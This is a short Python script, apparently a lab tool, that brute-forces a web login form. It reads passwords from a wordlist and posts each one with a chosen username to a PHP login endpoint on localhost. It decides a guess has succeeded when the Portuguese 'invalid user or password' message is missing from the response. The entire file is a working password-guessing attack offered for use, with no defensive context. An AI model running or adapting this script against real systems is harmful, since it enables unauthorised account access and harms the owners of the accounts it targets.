import requests
import sys

url = 'http://localhost:8080'
endpoint = '/Login/logar.php'

url_full = url + endpoint

def login(target, wordlist):
    passwords = open(wordlist, 'r')

    for password in passwords:
        password = password.rstrip()

        data = {'username': target, 'password': password, 'btn_logar': 'Login'}

        msg = 'Usuário ou senha inválido'

        r = requests.post(url_full, data=data)

        if msg in r.text:
            print(f'\033[31mPassword incorrect: {password}')

        else:
            print(f'\033[32mPassword found: {password}')
            break



# login('root', 'wordlist.txt')

def main():
    try:
        login(sys.argv[1], sys.argv[2])

    except IndexError:
        print(f'Erro: python {sys.argv[0]} <target> <wordlist>')
        exit()


if __name__ == "__main__":
    main()

